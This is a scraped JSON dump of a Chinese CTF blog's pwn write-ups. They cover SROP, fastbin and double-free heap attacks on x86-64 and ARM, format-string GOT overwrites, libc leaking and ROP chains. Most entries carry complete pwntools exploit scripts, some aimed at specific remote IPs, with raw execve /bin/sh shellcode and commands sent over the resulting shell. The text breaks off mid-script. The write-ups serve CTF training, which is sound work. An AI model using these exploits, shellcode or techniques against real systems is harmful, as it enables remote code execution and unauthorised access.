https://Winter3un.github.io/import roputilsimport binasciifrom pwn import *context(log_level=\"debug\")DEBUG = 0target = \"./pwn1\"remote_ip = \"172.16.5.43\"port = 5011rop = roputils.ROP(target)elf = ELF(target)# libc = ELF(\"./libc.so.6\")libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")# bss = rop.section('.bss')# rop.got('puts')# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x00\\x0b\\x0d\\x0a'if DEBUG: p = process(target) # gdb.attach(p,\"b*0x0400C84\\nc\") # gdb.attach(p,\"b*0x400EF4\\nc\")else: p = remote(remote_ip,port)def sl(data): p.sendline(data)def sd(data): p.send(data)def ru(data): return p.recvuntil(data)payload = \"%19$llX\"binhex = binascii.b2a_hex(payload)# print binhexru(\" exit\\n\")sl(\"3\")ru(\"\\n\")sl(\"0\"*(len(binhex)))ru(\"\\n\")sl(binhex)ru(\"sult is: \\n\")libc_start_addr = int(ru(\"Please \")[:len(\"7f041e5cda\")],16) - 240# print len(libc_start_addr)print \"libc_start_addr=\"+hex(libc_start_addr)libc_base = libc_start_addr - 0x1ec20system_addr = libc_base+libc.symbols[\"system\"]print \"system_addr=\"+hex(system_addr)_binsh = libc_base+0x155e43print \"_binsh=\"+hex(_binsh)# _binsh = libc_base+0x18C385ru(\" exit\\n\")sl(\"1\")ru(\"urn\\n\")sl(\"a\")ru(\"\\n\")payload = p64(system_addr)+p64(0)+p64(_binsh)payload = binascii.b2a_hex(payload)sl(\"a\"*0x90+payload)p.interactive()","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"AWD","slug":"AWD","permalink":"https://winter3un.github.io/tags/AWD/"}]},{"title":"【pwn】2017-429预赛","date":"2017-04-22T14:38:33.000Z","path":"2017/04/22/429-2017/","text":"前言槽点：这次比赛。。敢不敢。。不放原题。。。做了半天的pwn2，结果是原题。。。 T T （题目来自hitcon 2016，好吧。。怪我没刷到这题。。 不过pwn1和pwn2收获都很大，特别记录下。 PWN1pwn1很短很强悍~ 用到了SROP技术，参考资料 http://www.freebuf.com/articles/network/87447.html http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ elf文件非常小，只有几行指令。使用syscall 0 读取用户的输入至栈中。我们虽然可以控制程序的执行流，但是我们没办法控制寄存器的数值。正常利用条件为：控制rax为59，控制rdi为“/bin/sh”字符串的地址，rip指向syscall。后来想了想，rax的数值可以通过输入的字符数来控制，那么现在我们已经可以控制syscall调用execute了，但是我们却不能控制rdi的数值，这里我们可以利用SROP的技术，对所有寄存器进行重新赋值，使rdi指向“/bin/sh”的地址。然而利用SROP需要以下几个条件。 第一，攻击者可以通过stack overflow等漏洞控制栈上的内容；(√) 第二，需要知道栈的地址（比如需要知道自己构造的字符串/bin/sh的地址）；（√我们可以通过系统调用 1 write函数，进行栈空间信息泄露） 第三，需要知道syscall指令在内存中的地址(√)； 第四，需要知道sigreturn系统调用的内存地址(我们可以利用系统调用号 15 调用该函数)。 因此条件全部满足的情况下，我们利用SROP技术将rdi覆写，那么我们就可以顺利执行 execve（“/bin/sh”,null.null）;啦。（ps：需要注意的是，send过去的数据要有延迟，不然会认为是在一起的）exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-04-19 23:10:33# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/import roputilsfrom pwn import *import timecontext(log_level=\"debug\",arch=\"amd64\")DEBUG = 0target = \"./smallest\"remote_ip = \"106.75.61.55\"port = 20000rop = roputils.ROP(target)# bss = rop.section('.bss')# rop.got('puts')# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x00\\x0b\\x0d\\x0a'if DEBUG: p = process(target) # gdb.attach(p,\"b*main\\nc\")else: p = remote(remote_ip,port)def sl(data): p.sendline(data)def sd(data): time.sleep(3) p.send(data)def ru(data): return p.recvuntil(data)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = 0xdeadbeafframe.rsi = 0xdeadbeafframe.rdx = 0xdeadbeafframe.rsp = 0xdeadbeafframe.rip = 0x4000BEraw_input()# writepayload = p64(0x4000B0)+p64(0x4000B3)+p64(0x4000B0)sd(payload)sd(\"\\xb3\")stack_addr = u64(p.recv(16)[8:16]) - 0x1000print \"stack_addr=\"+hex(stack_addr)# frame # call read into stack_addrframe = SigreturnFrame()frame.rax = constants.SYS_readframe.rdi = 0x0frame.rsi = stack_addrframe.rdx = 0x400frame.rsp = stack_addrframe.rip = 0x4000BEpayload = p64(0x4000B0)payload +=p64(0)+str(frame)sd(payload)# returnpayload = p64(0x4000Be)payload += \"\\x00\"*(15-8)sd(payload)#frame# write /bin/shframe = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = stack_addr+0x150frame.rsi = 0x0frame.rdx = 0x0frame.rsp = stack_addrframe.rip = 0x4000Bepayload = p64(0x4000B0)payload +=p64(0)+str(frame)payload += \"a\"*(0x150-len(payload))+\"/bin/sh\\x00\"sd(payload)# returnpayload = p64(0x4000Be)payload += \"\\x00\"*(15-8)sd(payload)p.interactive() pwn2用到了很多姿势啊，台湾友人的pwn很强悍，hhhhhhh。 参考链接：http://w0lfzhang.me/2017/04/11/2016-HITCON-CTF-babyheap/ 非常坑的一点是，在ubuntu16.04下，scanf操作会在heap区域生成最少0x410大小的chunk。。。如果不知道这一点，这题是没法做的。（一定要在ubuntu16.04环境下测试该题哦~ 步骤： 1、利用scanf在heap区域生成0x1000大小的chunk，在末尾伪造chunk头，注意调整合适的size。我这边调整为0x70的 chunk size 2、利用null字节溢出导致虚表指针最低位字节变成00字节，指向我们伪造的fake chunk（注意，fake chunk是位于0x18大小的chunk之前的，） 3、free fake chunk 在下次new的时候，我们申请同样大小的chunk，会从fastbin中拿到我们刚才伪造的fake chunk，同时可以输入内容，覆盖虚表指针，导致任意地址写。。 4、我们可以利用2操作覆盖掉got表，修改exit为alarm，使我们可以重复利用1、2、3函数。 5、修改atoi为printf（这姿势第一次），然后通过格式化字符串泄露libc 6、再次覆写got ，将atoi改成system就好啦。。需要注意的是，printf返回值是他显示的字符数~ 非常nice的一题pwn，收获很大~ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138# off-by-one# fastbin attack# overwrite got# fmt#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-04-20 03:15:30# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/from pwn import *context(log_level=\"debug\")DEBUG = 1target = \"./hiddenlove\"remote_ip = \"\"port = 0rop = ELF(target)libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")# bss = rop.section('.bss')# rop.got('puts')# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x00\\x0b\\x0d\\x0a'if DEBUG: p = process(target) #gdb.attach(p,\"b*0x400B48\\nb*0x400A1A\\nc\") #gdb.attach(p,\"b*0x4008f4\\nc\")else: p = remote(remote_ip,port)def sl(data): p.sendline(data)def sd(data): p.send(data)def ru(data): return p.recvuntil(data)# stage 0ru(\"t her feet\\n\")sl(\"4\")ru(\"s for her?(Y/N)\\n\")sd(\"a\"*(0x1000-0x20)+p64(0)+p64(0x71))## stage 1ru(\"t her feet\\n\")sl(\"1\")ru(\" her(0~1000)\\n\")sl(str(0x20))ru(\"\\n\")sd(\"a\")ru(\"\\n\")sd(\"\\x00\"*8)def edit(addr,data): ## stage 2 ru(\"t her feet\\n\") sl(\"3\") ## stage 3 ru(\"t her feet\\n\") sl(\"1\") ru(\" her(0~1000)\\n\") sl(str(0x60)) ru(\"\\n\") sd(p64(0)*4+p64(0x100)+p64(0)+p64(addr)) ru(\"\\n\") sd(\"b\") # stage 4 ru(\"t her feet\\n\") sl(\"2\") ru(\"lings\\n\") sd(data)payload = p64(rop.symbols[\"free\"]+0x6) payload +=p64(rop.symbols[\"puts\"]+0x6)payload +=p64(rop.symbols[\"__stack_chk_fail\"]+0x6)payload +=p64(rop.symbols[\"setbuf\"]+0x6)payload +=p64(rop.symbols[\"printf\"]+0x6) payload +=p64(rop.symbols[\"alarm\"]+0x6)payload +=p64(rop.symbols[\"read\"]+0x6)payload +=p64(rop.symbols[\"__libc_start_main\"]+0x6)payload +=p64(rop.symbols[\"malloc\"]+0x6)payload +=p64(rop.symbols[\"printf\"]+0x6)# change atoi to printf (we can use fmt to leak addresspayload +=p64(rop.symbols[\"__isoc99_scanf\"]+0x6)payload +=p64(rop.symbols[\"alarm\"]+0x6) # change exit to alarmedit(rop.got[\"free\"],payload)# leakru(\"feet\\n\")sd(\"%7$s....\"+p64(rop.got[\"puts\"]))puts_addr = u64(ru(\"...\")[:6].ljust(8,\"\\x00\"))# read(0,buf,0x10)ru(\"feet\\n\")sd(\"%7$s....\"+p64(rop.got[\"printf\"]))# dl_reslove change printf_gotprintf_addr = u64(ru(\"...\")[:6].ljust(8,\"\\x00\"))print \"puts_addr=\"+hex(puts_addr)print \"printf_addr=\"+hex(printf_addr)system_addr = puts_addr-(libc.symbols[\"puts\"]-libc.symbols[\"system\"])print \"system_addr=\"+hex(system_addr)# change atoi to systempayload = p64(rop.symbols[\"free\"]+0x6) payload +=p64(rop.symbols[\"puts\"]+0x6)payload +=p64(rop.symbols[\"__stack_chk_fail\"]+0x6)payload +=p64(rop.symbols[\"setbuf\"]+0x6)payload +=p64(rop.symbols[\"printf\"]+0x6) payload +=p64(rop.symbols[\"alarm\"]+0x6)payload +=p64(rop.symbols[\"read\"]+0x6)payload +=p64(rop.symbols[\"__libc_start_main\"]+0x6)payload +=p64(rop.symbols[\"malloc\"]+0x6)payload +=p64(system_addr)# change atoi to printf (we can use fmt to leak addresspayload +=p64(rop.symbols[\"__isoc99_scanf\"]+0x6)payload +=p64(rop.symbols[\"alarm\"]+0x6) # change exit to alarmsd(\"aa\") # I have changed atoi to printf,so it return the number of my input charsru(\"lings\\n\")sd(payload)ru(\"feet\\n\")sd(\"/bin/sh\\x00\")p.interactive()# it's a funny pwn ~~~","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"}]},{"title":"arm_double_free_attack","date":"2017-04-10T15:50:31.000Z","path":"2017/04/10/arm-double-free-attack/","text":"题目来源自 X-NUCA 2016的note题目。题目资料全都可以从我的github上下载。 简单的堆溢出题目，但是环境在arm上，有一些小坑，比如说0x200的chunk在这边行不通了，只能用0x100的chunk，0x200好像比变成了large chunk，果然基础弱渣在这里是无法生存的。。。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-04-09 08:34:41# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/# import roputilsfrom pwn import *context(log_level=\"debug\")DEBUG = 1target = \"./note\"remote_ip = \"\"port = 0# rop = roputils.ROP(target)# bss = rop.section('.bss')# rop.got('puts')# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\\x00\\x0b\\x0d\\x0a'if DEBUG: p = process(target) # gdb.attach(p,\"b*main\\nc\")else: p = remote(remote_ip,port)def sl(data): p.sendline(data)def sd(data): p.send(data)def ru(data): return p.recvuntil(data)def add(length,data): ru(\"6. Exit\") sl(\"1\") # raw_input() ru(\"\\n\") sl(str(length)) ru(\"\\n\") sl(data)def dele(index): ru(\"6. Exit\") sl(\"2\") ru(\"the id:\") sl(str(index))def edit(index,data): ru(\"6. Exit\") sl(\"5\") ru(\"\\n\") sl(str(index)) ru(\"\\n\") sl(data)def edit_anyaddr(addr,data): edit(1,p32(0)+p32(addr)) edit(0,data) # stage 1 unlinkadd(0,\"a\"*0x8)#0add(0x100,\"aaa\")#1 &gt;=0x200会使用large chunkadd(0x100,\"aaa\")#2add(0x100,\"/bin/sh\\x00\")#3junk = \"\\x00\"*8head = p32(0)*2fake_head = p32(0)+p32(0x101)fd = p32(0x1205C+0x8-0xc)bk = p32(0x1205C+0x8-0x8)payload = junk+headpayload += fake_head+fd+bkpayload += \"a\"*(0x100-len(fake_head+fd+bk))payload += p32(0x100)+p32(0x108)edit(0,payload)raw_input()dele(2)# stage 2 edit free_gotedit_anyaddr(0x12024,p32(0x8538)[:-1])#有零字节溢出，会破坏下一个gotdele(3)p.interactive()","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"heap overflow","slug":"heap-overflow","permalink":"https://winter3un.github.io/tags/heap-overflow/"},{"name":"arm","slug":"arm","permalink":"https://winter3un.github.io/tags/arm/"}]},{"title":"【pwn】 初探pwntools fmt特性","date":"2017-04-09T15:16:41.000Z","path":"2017/04/09/初探pwntools-fmt特性/","text":"翻pwntools文档的时候突然发现了pwntools多了一个自动完成fmt漏洞利用的特性。 官方文档链接 http://pwntools.readthedocs.io/en/stable/fmtstr.html 在本地一看，pwntools还是2.x版本。。官方都已经更新到3.5版本了，于是果断更新= =。。 漏洞程序是这样子的 12345678910111213141516171819202122232425int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; // [sp+1Ch] [bp-184h]@2 int v4; // [sp+9Ch] [bp-104h]@2 int v5; // [sp+11Ch] [bp-84h]@2 int v6; // [sp+19Ch] [bp-4h]@1 v6 = *MK_FP(__GS__, 20); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); print_welcome(); while ( 1 ) &#123; printf(\"First input:\"); get_input(256, &amp;v3); printf(\"Second input:\"); get_input(256, &amp;v4); strcpy((char *)&amp;v5, (const char *)&amp;v3); printf((const char *)&amp;v5); putchar(44); printf((const char *)&amp;v4); putchar(10); puts(\"All is Done\"); &#125;&#125; 可以直接看到，有两处fmt漏洞，这是个循环，我们只需要循环利用其中一个fmt漏洞就可以。 我们可以利用pwntools提供fmt自动利用的功能快速算出格式化字符串在栈中的偏移。 1234567891011# stage 1 get fmt offsetdef exec_fmt(payload): p = process(target) p.recvuntil(\"input:\") p.sendline(payload) p.recvuntil(\"input:\") p.sendline(payload) return p.recvuntil(\",\")[:-1]autofmt = FmtStr(exec_fmt)offset = autofmt.offset 泄露出其中一个库函数地址后，利用我们本地搭建好的libc-database库算出system函数的地址。(如果出现多个匹配的话，就爆破吧:P 主要的还是它可以自动完成任意地址写的payload，就适合我这种深度懒癌患者 12345678def send_payload(payload): ru(\"input:\") sl(payload) ru(\"input:\") sl(\"/bin/sh\\x00\")autofmt = FmtStr(send_payload,offset=offset)autofmt.write(printf_got,system_addr)autofmt.execute_writes() 总的exp是这样子的。大概爆破三次就出结果，这还是我只泄露了一个库函数地址的情况下。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-04-08 21:08:57# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/import roputilsfrom pwn import *context(log_level=\"debug\")DEBUG = 1target = \"./echo\"rop = roputils.ROP(target)bss = rop.section('.bss')+0x30printf_got = rop.got('printf')if DEBUG: p = process(target) # gdb.attach(p,\"b*0x80486C1\\nc\")else: p = remote()def sl(data): p.sendline(data)def sd(data): p.send(data)def ru(data): return p.recvuntil(data)# stage 1 get fmt offsetdef exec_fmt(payload): p = process(target) p.recvuntil(\"input:\") p.sendline(payload) p.recvuntil(\"input:\") p.sendline(payload) return p.recvuntil(\",\")[:-1]autofmt = FmtStr(exec_fmt)offset = autofmt.offsetdef send_payload(payload): ru(\"input:\") sl(payload) ru(\"input:\") sl(\"/bin/sh\\x00\")# stage 2 get system_addroffset_system = [-63744, -78400, -55008, -57072, -55136, -61392, -55120, -59840, -64784, -59456, -58400, -58480, -60464, -76112, 3792, -70432, -58160, -1063904, -1042576, -1041936, -68192, -77448, -51488, -71904]for o in offset_system: try: p = process(target) printf_got = rop.got(\"printf\") puts_got = rop.got(\"puts\") ru(\"input:\") sl(p32(printf_got)+\"%7$s\") ru(\"input:\") sl(\"payload\") printf_addr = u32(p.recv(8)[4:]) ru(\"input:\") sl(p32(puts_got)+\"%7$s\") ru(\"input:\") sl(\"payload\") puts_addr = u32(p.recv(8)[4:]) print \"printf_addr=\"+hex(printf_addr) print \"puts_addr=\"+hex(puts_addr) system_addr = printf_addr+o # stage 3 change printf_addr to system_addr autofmt = FmtStr(send_payload,offset=offset) autofmt.write(printf_got,system_addr) autofmt.execute_writes() # print offset # print \"bss_addr=\"+hex(bss) # payload = fmtstr_payload(1,&#123;bss:0xdeadbeaf&#125;,1,\"byte\") # print payload p.interactive() except: continue 后记：啥时候出个FSP自动利用的啊。。","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"pwntools","slug":"pwntools","permalink":"https://winter3un.github.io/tags/pwntools/"},{"name":"fmt","slug":"fmt","permalink":"https://winter3un.github.io/tags/fmt/"}]},{"title":"how_to_get_libc","date":"2017-04-08T07:29:54.000Z","path":"2017/04/08/how-to-get-libc/","text":"比赛的时候，遇到比较坑爹的情况，没有提供给libc库，这个时候就需要用各种姿势去泄露libc库。 1、询问组委会，是否提供libc库，很有可能就放提示了 2、通过return2libc技巧，泄露got内保存的库函数地址，去 http://libcdb.com/ 找对应的库版本，这边我写了一个get_libc的小脚本（但并不是百分之一百能找到的。 12345678910111213141516171819202122232425262728293031323334353637383940from requests import *import re# a_name = raw_input('input a_name= ')# a_addr = raw_input('input a_addr=')# b_name = raw_input('input b_name=')# b_addr = raw_input('input b_addr=')# a_name= 'read'# a_addr='0xb76a9bd0'# b_name='shutdown'# b_addr='0xb76bc610'a_name='printf'a_addr='0x7f0ff5dadba0'b_name='read'b_addr='0x7f0ff5e50470'may_system_offset=[]url = 'http://libcdb.com/search?symbolA='+a_name+'&amp;addressA='+a_addr+'&amp;symbolB='+b_name+'&amp;addressB='+b_addrr1 = get(url)list_ = re.findall(r'&lt;li&gt;&lt;a href=\"(.*?)\"&gt;Libc\\:',r1.content)payload = 'may_system_offset = ['if len(list_)&gt;0: for x in list_: url = 'http://libcdb.com'+x+'/symbols?name=__libc_system' system_offset = get(url) system_offset = re.findall(r'/dt&gt;\\n &lt;dd&gt;(.*?)&lt;/dd&gt;\\n \\n &lt;/dl&gt;',system_offset.content)[0].replace('libc_base + 0x','') print system_offset url = 'http://libcdb.com'+x+'/symbols?name='+b_name func_offset = get(url) # print func_offset.content func_offset = re.findall(r'&gt;'+b_name+'&lt;/dt&gt;\\n &lt;dd&gt;(.*?)&lt;/dd&gt;',func_offset.content)[0].replace('libc_base + 0x','') may_system_offset.append(int(system_offset,16)-int(func_offset,16)) may_system_offset = list(set(may_system_offset)) for x in may_system_offset: payload += hex(x)+',' payload = payload[:-1] print payload+']'else: print 'oops! nothing!' raw_input() 3、利用return to dl resolve技术，这个已经有成熟的辅助工具了。https://github.com/inaz2/roputils 4、利用其他题目的libc库，出题人为了方便，很有可能用的相同libc库 5、利用pwntools提供的dynelf函数来寻找system地址，不过需要有个leak函数。可参考 http://bobao.360.cn/learning/detail/3298.html （蛋疼的是，不知道为啥我的ELF()函数一直是坏的。 2017/5/23日添加 6、泄露Smallbin的FD、BK进行libc base获取","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"}]},{"title":"【pwn】T3CTF2017 堆溢出以及return to  dl slove","date":"2017-04-08T07:26:51.000Z","path":"2017/04/08/T3CTF2017/","text":"pwn1，没什么好说的，看了下checksec，NX没开，栈迁移以后直接执行bss上的shellcode就可以了。 1234567891011121314151617from roputils import *import pwnp = pwn.remote(\"127.0.0.1\",12346)addr_bss = 0x0804A080buf = p32(0x0804A080+4)+\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"buf += (0x1f4-len(buf))*'a'p.send(buf)buf = 'a'*504buf += p32(0x0804A080+4)p.sendline(buf)data = p.recvuntil(\"\\n\")p.sendline(\"cat /lib/x86_64-linux-gnu/libc.so.6\")p.interactive() pwn2的libc可以从pwn1中获取。非常经典的double free教学题。可以参考 http://www.tuicool.com/articles/yquU732 （double free浅析，乌云的文章） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-04-07 19:09:17# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/from pwn import *context(log_level=\"debug\")DEBUG = 0if DEBUG: p = process('./pwn2') # gdb.attach(p,\"b*0x0400A6D\\nc\")else: p = remote(\"120.27.248.138\",12345)def sd(data): p.sendline(data)def ru(data): return p.recvuntil(data)def add(index,length,data): ru(\"the action:\") sd(\"1\") ru(\"note index:\\n\") sd(str(index)) ru(\" of the new note:\\n\") sd(str(length)) ru(\"ts of note:\") sd(data)def dele(index): ru(\"the action:\") sd(\"2\") ru(\"ter the note index:\") sd(str(index))def edit(index,length,data): ru(\"the action:\") sd(\"3\") ru(\" note index:\") sd(str(index)) ru(\" new note:\") sd(str(length)) ru(\"of note:\\n\") sd(data)def show(index): ru(\"the action:\") sd(\"4\") ru(\" note index:\") sd(str(index))def edit_anyaddr(addr,data): payload = '\\x00'*0x18+p64(0x6020a8)+p64(0)+p64(addr) edit(0,len(payload),payload) edit(2,len(data),data)add(0,512,\"aaa\")add(1,512,\"aaa\")add(2,512,\"aaa\")add(3,512,\"/bin/sh\\x00\")head = p64(0)+p64(1+512)fd = p64(0x6020C0 - 0x18)bk = p64(0x6020C0 - 0x10)payload = head+fd+bkpayload += \"a\"*(512-len(payload))payload += p64(512)+p64(512+0x10)payload += \"a\"*(600-len(payload))edit(0,600,payload)dele(1)free_got = 0x602018edit_anyaddr(0x6020C0+0x20,p64(puts_got))show(4)free_addr = u64(ru(\"\\n\")[:-1].ljust(8,\"\\x00\"))print \"free_addr=\"+hex(free_addr)offset = 0x83940-0x45390system_addr = puts_addr - offsetedit_anyaddr(0x602018,p64(system_addr))dele(3)p.interactive()#flag&#123;038a6d27a716d1e1472b1eded07c385d&#125; pwn3是fastbin double free attack的考察点，要利用这个攻击我们需要伪造出一个fake fastbin出来,所幸题目给予了所有的攻击条件。 可参考 https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-04-07 19:09:17# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/import roputilsfrom pwn import *context(log_level=\"debug\")DEBUG = 1if DEBUG: p = process('./pwn3') # gdb.attach(p,\"b*0x4009da\\nc\")# else:# p = remote()def sd(data): p.sendline(data)def ru(data): return p.recvuntil(data)def welcome(data): ru(\"name\\n\") sd(data)def add(index,length,data): ru(\"delete paper\\n\") sd(\"1\") ru(\"o store(0-9):\") sd(str(index)) ru(\"ill enter:\") sd(str(length)) ru(\"our content:\") sd(data)def add2(index,length,data): sd(\"1\") ru(\"o store(0-9):\") sd(str(index)) ru(\"ill enter:\") sd(str(length)) ru(\"our content:\") sd(data)def dele(index): ru(\"delete paper\\n\") sd(\"2\") ru(\"index(0-9):\") sd(str(index))def setsize(size): ru(\"delete paper\\n\") sd(\"3\") ru(\"number:\") sd(str(size))def leak_stack(): ru(\"delete paper\\n\") sd(\"a\"*(0x30)) ru(\"\\n\") sd(\"a\"*(0x30)) return u64(ru(\"\\n\")[0x30:0x30+6].ljust(8,\"\\x00\"))buf = \"\"buf += \"\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"buf += \"\\x00\\x53\\x48\\x89\\xe7\\x68\\x2d\\x63\\x00\\x00\\x48\\x89\\xe6\"buf += \"\\x52\\xe8\\x08\\x00\\x00\\x00\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"buf += \"\\x00\\x56\\x57\\x48\\x89\\xe6\\x0f\\x05\"shellcode = bufshellcode_addr = 0x6020c0welcome(shellcode)setsize(0x30)stack_addr = leak_stack()print \"stack_addr=\"+hex(stack_addr)offset = 0x7ffcfca53d30 - 0x00007ffcfca53c20 target_addr = stack_addr-offset-0x8print \"offset = \"+hex(offset)print \"target_addr = \"+hex(target_addr)add2(0,0x20,\"aaa\")add(1,0x20,\"aaa\")dele(0)dele(1)dele(0)#a-b-aadd(0,0x20,p64(target_addr))add(1,0x20,\"aaa\")add(2,0x20,p64(target_addr))payload = \"a\"*0x10+p64(shellcode_addr)add(3,0x20,payload)sd(\"4\")p.interactive()","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"heap overflow","slug":"heap-overflow","permalink":"https://winter3un.github.io/tags/heap-overflow/"}]},{"title":"ARM环境下栈溢出攻击初探","date":"2017-04-07T08:34:42.000Z","path":"2017/04/07/ARM-overflow/","text":"题目来自于2016年全国高校网安联赛pwn专场。 参考文献：http://www.freebuf.com/articles/terminal/107276.html 其中有一题warmup的题目，常规思路，使用file命令查看该文件格式，发现是arm下静态文件，之后常规考虑用ROPgadget生成ropchain，放入栈中执行，但是这边有区别，arm是以r0寄存器存放第一个函数参数的。所以我们需要手工构造ropchain，首先去找system函数，虽然该bin文件去符号化了，但是由于存在/bin/sh字符串，跟踪一下就发现了如下函数。 这不就是system函数么。。。 接着用ROPgadget来找一个控制r0寄存器的ropchain就可以了。。如下命令 ROPgadget --binary warmup --only &quot;pop&quot;|grep r0 找到了 0x00020904 : pop {r0, r4, pc} 接着就剩下构造ropchian并执行了，如下脚本。 123456789101112from pwn import *context(log_level=\"debug\")p = process('./warmup')p.recvuntil('\\n')p.sendline()raw_input()pr0_pr4_ret =0x00020904bin_sh = 0x6C384system = 0x110B4payload = p32(pr0_pr4_ret)+p32(bin_sh)+p32(0)+p32(system)p.sendline('a'*0x70+payload)p.interactive() 另一题login，模糊测试一下直接出payload。 1234567891011from pwn import *import base64context(log_level=\"debug\")p = process('./login')payload = '\\x61\\x86\\x18\\x61\\x86\\x18\\x61\\x86\\x18\\x61\\x86\\x18\\x61\\x86\\x18\\x61\\x86\\x18\\x61\\x86\\x18\\x61\\x86\\x18\\x5d'p.recvuntil('Code\\n\\n')p.sendline(payload)raw_input()p.interactive()","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"ARM","slug":"ARM","permalink":"https://winter3un.github.io/tags/ARM/"}]},{"title":"fastbin attack 利用","date":"2017-04-07T04:50:15.000Z","path":"2017/04/06/fastbin-attack/","text":"这也算是给自己补补堆溢出的姿势吧。 题目是一题来自bctf二月场的fastbin attack 非常经典的一题教学题，当时由于知识点没有get到，所以没做出来，一直放桌面，最近闲太碍眼了，开始日。 首先补一波fast bin attack的姿势，参考自freebuf:http://www.freebuf.com/news/88660.html 基本上看着这个就能做出题目了。 这题题目涉及到了两个考点1、UAF姿势 2、fastbin attack 的姿势 注意点是，malloc fastbin 会检测长度，如果长度不符合就会报错，就像下面这样。所以需要使待malloc的fast chunk内的size符合要求。。（BTW chunk结构不多说了，自己去百度）这一般情况下需要自己去构造，不过这题例外，题目给出了利用点，即地址为0x6C4Aa0 ，所以说教学题。。很经典。。。 接着我们就可以任意地址写啦~~,不过我们的目的是要拿到shell，这题是静态编译的，所以我们可以考虑下用ropchain来拿shell 需要用rop的话，栈内的数据必须是我们可控的，目前手里有个任意地址写的漏洞，但是我们不知道栈的地址，所以我们接下去要做的就是拿到栈地址，需要有个函数来泄露栈地址。这边将free_hook修改成printf函数的地址，在调用free的时候会跳转到printf执行。泄露栈地址之后，将我们的rop写入栈，并执行。exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2017-04-06 07:15:19# @Author : WinterSun (511683586@qq.com)# @Link : https://Winter3un.github.io/from pwn import *context(log_level=\"debug\")DEBUG = 1if DEBUG: p = process('./fast-fast-fast') gdb.attach(p,\"b*0x40141B\\nc\")# else:# p = remote()def sl(data): p.sendline(data)def sd(data): p.send(data)def ru(data): return p.recvuntil(data)def create_fast(data): ru(\"saysecret\\n\") sl(\"1\") ru(\"delet\\n\") sl('1') ru(\"\\n\") sl(data)def edit_fast(data): ru(\"saysecret\\n\") sl(\"1\") ru(\"delet\\n\") sl('2') ru(\"\\n\") sl(data)def del_fast(): ru(\"saysecret\\n\") sl(\"1\") ru(\"delet\\n\") sl('3')def create_small(data): ru(\"saysecret\\n\") sl(\"2\") ru(\"delet\\n\") sl('1') ru(\"\\n\") sl(data)def edit_small(data): ru(\"saysecret\\n\") sl(\"2\") ru(\"delet\\n\") sl('2') ru(\"\\n\") sl(data)def del_small(): ru(\"saysecret\\n\") sl(\"2\") ru(\"delet\\n\") sl('3')def say(): ru(\"saysecret\\n\") sl(\"3\")def edit(addr,data): edit_fast(p64(1)+p64(0xFB0)+p64(addr))#change small chunk edit_small(data)def getchain(): from struct import pack p = '' p += pack('&lt;Q', 0x0000000000401b97) # pop rsi ; ret p += pack('&lt;Q', 0x00000000006c1060) # @ .data p += pack('&lt;Q', 0x000000000044d8e4) # pop rax ; ret p += '/bin//sh' p += pack('&lt;Q', 0x00000000004714a1) # mov 